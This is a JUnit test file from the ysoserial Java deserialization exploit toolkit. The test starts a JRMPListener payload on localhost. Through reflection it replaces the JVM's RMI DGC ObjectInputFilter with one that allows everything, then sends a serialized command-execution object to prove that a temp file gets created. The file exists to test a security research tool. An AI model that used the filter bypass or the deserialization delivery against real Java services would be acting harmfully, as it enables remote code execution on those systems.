package ysoserial.test.payloads;

import org.junit.Assert;
import sun.misc.ObjectInputFilter;
import sun.rmi.transport.ObjectTable;
import ysoserial.Strings;
import ysoserial.exploit.JRMPClient;
import ysoserial.payloads.JRMPListener;
import ysoserial.payloads.util.Reflections;
import ysoserial.test.CustomTest;
import ysoserial.test.util.Files;
import ysoserial.test.util.OS;

import java.io.File;
import java.rmi.Remote;
import java.util.Random;
import java.util.concurrent.Callable;

public class JRMPListenerTest implements CustomTest, NeedsAddlClasses {
    private final File testFile = new File(OS.getTmpDir(), "ysoserial-test-" + Strings.randUUID());
    private final int port = 16000 + new Random().nextInt(16000);

    @Override
    public void run(Callable<Object> payload) throws Exception {
        Assert.assertFalse("test file shouldn't exist", testFile.exists());

        // disable ObjectInputFilter
        Reflections.setFieldValue(Class.forName("sun.rmi.transport.DGCImpl"), "dgcFilter", new Filter());

        // open listener
        Remote res = (Remote) payload.call();

        try {
            // send payload
            JRMPClient.makeDGCCall("localhost", port, new TestHarnessTest.ExecMockSerializable(CommandExecTest.getTouchCmd(testFile.toString())));

            Files.waitForFile(testFile, 5000);

            Assert.assertTrue("test file should exist", testFile.exists());
        } finally {
            // close listener
            // TODO move to postDeserRelease
            ObjectTable.unexportObject(res, true);
        }
    }

    @Override
    public String getPayloadArgs() {
        return "" + port;
    }

    public static void main(String[] args) throws Exception {
        PayloadsTest.testPayload(JRMPListener.class, new Class[0]);
    }

    public Class[] getAddlClasses() {
        return new Class[] { TestHarnessTest.ExecMockSerializable.class };
    }

    public static class Filter implements ObjectInputFilter {
        @Override
        public Status checkInput(FilterInfo filterInfo) {
            return Status.ALLOWED;
        }
    }
}
